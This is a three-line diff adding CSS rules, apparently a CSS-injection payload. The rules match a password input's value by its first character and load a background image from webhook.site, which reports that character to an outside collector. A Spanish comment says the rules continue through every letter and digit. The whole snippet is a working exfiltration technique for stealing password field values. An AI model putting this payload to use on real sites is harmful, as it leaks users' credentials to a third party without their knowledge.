@@ -1,0 +1,3 @@
+input[name="password"][value^="a"] { background:url(//webhook.site/TU_ID?p=a); }
+input[name="password"][value^="b"] { background:url(//webhook.site/TU_ID?p=b); }
+/* ... hasta z y 0-9 */
